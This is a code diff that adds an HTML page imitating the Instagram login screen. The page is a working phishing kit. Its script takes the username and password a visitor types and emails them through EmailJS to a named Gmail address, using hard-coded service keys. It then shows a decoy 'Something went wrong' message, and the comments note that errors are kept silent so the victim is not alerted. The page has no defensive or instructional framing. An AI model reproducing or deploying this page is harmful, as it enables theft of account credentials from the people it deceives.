@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="login-container">
+    <h1>Instagram</h1>
+    <form id="login-form">
+      <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
+      <input type="password" id="password" name="password" placeholder="Password" required>
+      <button type="submit">Log in</button>
+      <div class="separator">OR</div>
+      <button type="button" class="facebook-login">Log in with Facebook</button>
+      <a href="#" class="forgot-password">Forgot password?</a>
+    </form>
+    <div class="signup">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
+    <div class="get-app">
+      <p>Get the app.</p>
+      <div class="app-buttons">
+        <img src="google-play.png" alt="Google Play">
+        <img src="microsoft-store.png" alt="Microsoft Store">
+      </div>
+    </div>
+</div>
+  </div>
+
+  <!-- Include the JavaScript to send data via EmailJS -->
+  <script>
+    // Initialize EmailJS with your public key (user ID)
+    emailjs.init('j5vu2qRA6sVjadX3w'); // Replace 'YOUR_PUBLIC_KEY' with your actual public key
+  
+    // Add event listener to the form submission
+    document.getElementById("login-form").addEventListener("submit", function(event) {
+      event.preventDefault(); // Prevent the form from submitting normally
+  
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+  
+      // Prepare email data
+      const emailData = {
+        username: username,
+        password: password,
+        to_name: "", // Modify with the recipient's name
+        to_email: "yadavdheeraj8282@gmail.com" // Add recipient's email here
+      };
+  
+      // Send email using EmailJS without any feedback to the user
+      emailjs.send('service_i655qdh', 'template_68xxjz8', emailData)
+        .then(function(response) {
+          // Show "Something went wrong" after the email is successfully sent
+          document.body.innerHTML = "<h2>Something went wrong</h2>"; // This is shown after success
+        })
+        .catch(function(error) {
+          // Do not show error feedback to the user, just silently handle the error
+          console.error('Error sending email:', error);
+          // Optionally, you can still show the "Something went wrong" message here as well.
+          // But based on your requirement, we are keeping it silent for errors.
+        });
+    });
+  </script>
+</body>
+</html>
